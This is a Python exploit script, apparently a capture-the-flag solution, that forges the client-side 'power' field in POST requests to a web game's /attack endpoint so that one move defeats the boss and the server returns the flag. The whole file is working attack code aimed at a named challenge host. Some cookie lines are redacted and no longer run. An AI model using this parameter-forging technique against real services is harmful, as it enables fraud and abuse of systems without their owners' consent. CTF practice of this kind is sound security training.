#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""新宿决战1 —— /attack 直接信任客户端提交的 power，伪造一次 200000 伤害秒杀宿傩拿 flag

漏洞点：
  前端把 <button data-power="60|90|140|180"> 的数值放进 JSON body 的 power 字段，
  后端 /attack 不做白名单/上限校验，直接用该值扣血。
  正常玩法宿傩 200000 HP、每次最多 180 伤害（需 1112 回合），五条悟 1000 HP 先被打死；
  伪造 power=200000 一回合结束，服务端在 result=="victory" 时把 flag 写进 JSON 和日志。

用法：
  python exp.py            # 两次独立会话复现（不同 power），校验 flag 一致性
"""
import http.cookiejar
import json
import re
import urllib.request
from pathlib import Path

BASE = "http://u8q0hcswmbnhwz70.neu-nex.fun"
EV = Path(__file__).with_name("evidence")
EV.mkdir(exist_ok=True)
FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]+\}")


def session():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    opener.open(urllib.request.Request(BASE + "/", headers={"User-Agent": "curl/8.4.0"})).read()
    return opener, jar


def attack(op, cookie, payload, tag):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(
        BASE + "/attack", data=body, method="POST",
        headers={"Content-Type": "application/json", "User-Agent": "curl/8.4.0"},
    )
    raw_req = (
        "POST /attack HTTP/1.1\n"
        "Host: u8q0hcswmbnhwz70.neu-nex.fun\n"
        "Content-Type: application/json\n"
        "Cookie=<REDACTED>"
        "Content-Length: %d\n\n%s\n" % (cookie, len(body), body.decode())
    )
    r = op.open(req)
    txt = r.read().decode()
    (EV / f"{tag}_req.txt").write_text(raw_req, encoding="utf-8")
    (EV / f"{tag}_resp.txt").write_text(
        "HTTP/1.1 %d\n%s\n\n%s" % (r.status, r.headers, txt), encoding="utf-8")
    return json.loads(txt)


def run(power, skill="void", tag="step2"):
    op, jar = session()
    cookie=<REDACTED> for c in jar if c.name == "session")
    print(f"[*] {tag}: battle_id={cookie.split('.')[0]}, payload power={power!r}")
    data = attack(op, cookie, {"skill": skill, "power": power}, tag)
    print("    result=%r sukuna_hp=%r gojo_hp=%r flag_key=%r" %
          (data.get("result"), data.get("sukuna_hp"), data.get("gojo_hp"), "flag" in data))
    for line in data.get("log", [])[-4:]:
        print("    log:", line)
    flags = set(FLAG_RE.findall(json.dumps(data, ensure_ascii=False)))
    if data.get("flag"):
        flags.add(data["flag"])
    return data, flags


def main():
    d1, f1 = run(200000, "void", "step2")          # 数值型，正好超过宿傩最大 HP
    d2, f2 = run("1000000", "he", "step3")         # 字符串型 + 另一个技能，确认与输入无关
    assert d1["result"] == "victory" and d2["result"] == "victory", "未触发胜利"
    assert f1 and f1 == f2, f"两次 flag 不一致: {f1} vs {f2}"
    flag = f1.pop()
    assert FLAG_RE.fullmatch(flag), flag
    # 独立证据 2：日志原文里出现 "flag: <flag>"
    assert any(line.startswith("flag:") and line.endswith(flag) for line in d1["log"]), "日志无 flag 原文"
    print("[+] FLAG:", flag)
    (EV / "step2_flag.txt").write_text(flag + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
